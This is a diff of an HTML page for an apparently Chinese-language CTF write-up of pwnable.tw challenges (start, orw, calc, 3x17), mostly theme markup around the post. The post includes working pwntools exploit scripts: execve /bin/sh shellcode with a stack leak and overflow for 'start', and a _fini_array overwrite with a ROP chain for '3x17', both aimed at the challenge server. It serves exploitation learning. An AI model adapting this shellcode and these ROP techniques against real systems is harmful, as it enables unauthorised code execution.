@@ -1,89 +1,146 @@
-<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>pwnable.tw | Stay hungry</title><meta name="description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5"><meta name="author" content="X1do0"><meta name="copyright" content="X1do0"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="pwnable.tw"><meta name="twitter:description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5"><meta name="twitter:image" content="https://i.loli.net/2020/07/09/DqUt6w5rcdEmCps.png"><meta property="og:type" content="article"><meta property="og:title" content="pwnable.tw"><meta property="og:url" content="https://xidoo123.github.io/2020/07/03/pwnable-tw/"><meta property="og:site_name" content="Stay hungry"><meta property="og:description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5"><meta property="og:image" content="https://i.loli.net/2020/07/09/DqUt6w5rcdEmCps.png"><meta property="article:published_time" content="2020-07-03T12:40:23.000Z"><meta property="article:modified_time" content="2020-11-07T08:20:29.376Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw">
+<meta property="og:url" content="https://xidoo123.github.io/2020/07/03/pwnable-tw/index.html">
+<meta property="og:site_name" content="Stay hungry">
+<meta property="og:description" content="start开幕雷击，没有完整程序。分析汇编考虑在栈上填充shellcode ，得想办法泄露栈地址。发现程序本身sys_write 调用前有mov ecx,esp ，所以覆盖到这个地方就可以打印esp 值指向的内容，这个内容经过调试发现与esp的值差0x4 ，故解决。 123456789101112131415from pwn import *#sc&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x5">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-07-03T12:40:23.000Z">
+<meta property="article:modified_time" content="2020-11-07T08:20:29.376Z">
+<meta property="article:author" content="X1do0">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/veg.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pwnable.tw</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
 
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
 
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://xidoo123.github.io/2020/07/03/pwnable-tw/"><link rel="next" title="Ubuntu16.04 docker搭建" href="https://xidoo123.github.io/2020/06/28/bulitDocker/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: 'Copy successfully',
-    error: 'Copy error',
-    noSupport: 'The browser does not support'
-  },
-  bookmark: {
-    message_prev: 'Press',
-    message_next: 'to bookmark this page'
-  },
-  runtime_unit: 'days',
-  runtime: true,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/06/28/bulitDocker/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xidoo123.github.io/2020/07/03/pwnable-tw/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&text=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&is_video=false&description=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw&body=Check out this article: https://xidoo123.github.io/2020/07/03/pwnable-tw/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&name=pwnable.tw&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xidoo123.github.io/2020/07/03/pwnable-tw/&t=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3x17"><span class="toc-number">4.</span> <span class="toc-text">3x17</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pwnable.tw
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">X1do0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-03T12:40:23.000Z" itemprop="datePublished">2020-07-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
   
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isSidebar: true  
-  }</script><noscript><style>
-#page-header {
-  opacity: 1
-}
-.justified-gallery img{
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 4.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><canvas class="fireworks"></canvas><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">7</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3x17"><span class="toc-number">4.</span> <span class="toc-text">3x17</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(https://i.loli.net/2020/07/09/DqUt6w5rcdEmCps.png)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">Stay hungry</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">pwnable.tw</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2020-07-03 20:40:23"><i class="fa fa-calendar" aria-hidden="true"></i> Created 2020-07-03</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2020-11-07 16:20:29"><i class="fa fa-history" aria-hidden="true"></i> Updated 2020-11-07</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>开幕雷击，没有完整程序。分析汇编考虑在栈上填充<code>shellcode</code> ，得想办法泄露栈地址。发现程序本身<code>sys_write</code> 调用前有<code>mov ecx,esp</code> ，所以覆盖到这个地方就可以打印<code>esp</code> 值指向的内容，这个内容经过调试发现与<code>esp</code>的值差<code>0x4</code> ，故解决。</p>
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><p>开幕雷击，没有完整程序。分析汇编考虑在栈上填充<code>shellcode</code> ，得想办法泄露栈地址。发现程序本身<code>sys_write</code> 调用前有<code>mov ecx,esp</code> ，所以覆盖到这个地方就可以打印<code>esp</code> 值指向的内容，这个内容经过调试发现与<code>esp</code>的值差<code>0x4</code> ，故解决。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sc="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sc = <span class="string">"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">io = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Let's start the CTF:"</span>)</span><br><span class="line">io.send(<span class="string">'a'</span>*<span class="number">20</span>+p32(<span class="number">0x08048087</span>))</span><br><span class="line"></span><br><span class="line">esp = u32(io.recv(<span class="number">4</span>)) - <span class="number">0x4</span></span><br><span class="line">success(<span class="string">"esp:"</span>+hex(esp))</span><br><span class="line">io.send( <span class="string">'a'</span>*<span class="number">20</span> + p32(esp+<span class="number">24</span>) + sc)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>seccomp只允许orw，用shellcraft写</p>
@@ -98,8 +155,133 @@ function activateLightMode(){
 <p><a href="https://kirin-say.top/2019/02/08/pwnable-tw-3x17/" target="_blank" rel="noopener">https://kirin-say.top/2019/02/08/pwnable-tw-3x17/</a> Kirin师傅题解</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level="debug"</span></span><br><span class="line"><span class="comment">#p=process("3x17")</span></span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#_fini_array</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x402960</span>)+p64(<span class="number">0x401b6d</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#rop_chain</span></span><br><span class="line">pop_rdi=<span class="number">0x401696</span></span><br><span class="line">pop_rax=<span class="number">0x41e4af</span></span><br><span class="line">pop_rdx_rsi=<span class="number">0x44a309</span></span><br><span class="line">bin_sh_addr=<span class="number">0x4b4140</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4100</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdi))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4108</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(bin_sh_addr)+p64(pop_rax)+p64(<span class="number">0x3b</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4120</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(pop_rdx_rsi)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b4138</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x446e2c</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get_shell</span></span><br><span class="line">p.sendlineafter(<span class="string">"addr:"</span>,str(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendafter(<span class="string">"data:"</span>,p64(<span class="number">0x401c4b</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">X1do0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://xidoo123.github.io/2020/07/03/pwnable-tw/">https://xidoo123.github.io/2020/07/03/pwnable-tw/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/07/09/DqUt6w5rcdEmCps.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2020/06/28/bulitDocker/"><img class="next_cover" src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Ubuntu16.04 docker搭建</div></div></a></div></nav></article></main><footer id="footer" style="background-image: url(https://i.loli.net/2020/07/09/DqUt6w5rcdEmCps.png)" data-type="photo"><div id="footer-wrap"><div class="copyright">&copy;2020 By X1do0</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="/js/third-party/fireworks.js"></script><script id="canvas_nest" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@3/instantpage.min.js" type="module"></script><script>var endLoading = function () {
-  document.body.style.overflow = 'auto';
-  document.getElementById('loading-box').classList.add("loaded")
-}
-window.addEventListener('load',endLoading)</script></body></html>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#start"><span class="toc-number">1.</span> <span class="toc-text">start</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#orw"><span class="toc-number">2.</span> <span class="toc-text">orw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">3.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3x17"><span class="toc-number">4.</span> <span class="toc-text">3x17</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xidoo123.github.io/2020/07/03/pwnable-tw/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&text=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&is_video=false&description=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw&body=Check out this article: https://xidoo123.github.io/2020/07/03/pwnable-tw/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&title=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xidoo123.github.io/2020/07/03/pwnable-tw/&name=pwnable.tw&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xidoo123.github.io/2020/07/03/pwnable-tw/&t=pwnable.tw" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
